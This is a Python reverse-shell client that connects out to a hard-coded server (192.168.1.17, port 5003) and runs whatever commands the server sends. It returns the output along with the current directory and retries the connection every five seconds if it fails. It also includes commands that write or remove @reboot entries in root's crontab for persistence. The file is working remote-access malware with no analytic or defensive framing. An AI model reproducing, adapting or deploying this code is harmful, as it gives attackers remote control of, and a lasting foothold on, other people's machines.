import platform
import socket
import os
import subprocess
import sys
import time

SERVER_HOST = "192.168.1.17"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

while True:
    try:
        #CREATION OF SOCKET
        # create the socket object
        s = socket.socket()

        #BINDING OF SOCKET
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))

        #FIRST INTERACTION WITH SERVER
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())

        #INTERACTION WITH SERVER
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""

            elif splited_command[0].lower() == "create_cronjob":
                # create a cronjob that starts with the machine
                cronjob = f"@reboot {command[15:]}\n"
                # write the cronjob to the crontab file
                with open('/var/spool/cron/crontabs/root', 'a') as file:
                    file.write(cronjob)
                # get the current working directory as output
                cwd = os.getcwd()
                # set the output to success message
                output = "Cronjob created successfully!"
                # send the results back to the server
                message = f"{output}{SEPARATOR}{cwd}"
                s.send(message.encode())

            elif splited_command[0].lower() == "destroy_cronjob":
                # read the current cron jobs
                with open('/var/spool/cron/crontabs/root', 'r') as file:
                    lines = file.readlines()

                # remove the cron job that starts with the command
                lines = [line for line in lines if not line.startswith(f"@reboot {command[16:]}")]

                # write the remaining cron jobs back to the crontab
                with open('/var/spool/cron/crontabs/root', 'w') as file:
                    file.writelines(lines)

                output = "Cronjob destroyed successfully!"
            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
        break
    except socket.error:
        print("Socket error, retrying...")
        time.sleep(5)